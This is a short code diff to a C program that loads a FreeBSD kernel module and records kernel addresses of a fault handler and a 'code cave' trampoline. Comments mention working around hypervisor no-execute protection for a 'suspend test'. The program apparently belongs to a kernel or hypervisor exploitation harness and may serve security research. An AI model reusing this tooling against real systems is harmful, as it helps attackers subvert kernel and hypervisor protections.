@@ -1193,10 +1193,9 @@ static void campaign_kmod_kldload(void) {
         if (!need_idt_invoke && results->magic == KMOD_MAGIC) {
             printf("\n[*] Step 4b: SYSINIT fired with KMOD_MAGIC — checking result buffer addresses...\n");
 
-            if (results->gp_handler_kva != 0 &&
-                results->trampoline_func_kva != 0 &&
+            if (results->trampoline_func_kva != 0 &&
                 results->trampoline_target_kva != 0) {
-                g_kmod_gp_handler = results->gp_handler_kva;
+                g_kmod_gp_handler = results->gp_handler_kva;  /* may be 0 (Phase 9 removed) */
                 g_kmod_trampoline_func = results->trampoline_func_kva;
                 g_kmod_trampoline_target = results->trampoline_target_kva;
                 g_kmod_kid = kid;
@@ -1797,6 +1796,15 @@ static void campaign_kmod_kldload(void) {
                        (unsigned long)g_kmod_trampoline_func, KMOD_XAPIC_OFFSET);
                 printf("    g_trampoline_target     = 0x%016lx (RIP+disp32, disp=%d)\n",
                        (unsigned long)g_kmod_trampoline_target, (int)disp);
+
+                /* Preserve KLD .text addresses for suspend test.
+                 * The cave trampoline may later overwrite g_kmod_trampoline_func,
+                 * but we need the real kmod .text address for suspend where
+                 * kdata is NX-blocked by the HV. */
+                g_kld_text_trampoline = g_kmod_trampoline_func;
+                g_kld_text_target = g_kmod_trampoline_target;
+                printf("[+] KLD .text trampoline preserved: 0x%016lx\n",
+                       (unsigned long)g_kld_text_trampoline);
 
             } else {
                 printf("[!] trampoline_xapic_mode signature mismatch at +0x%x:\n",
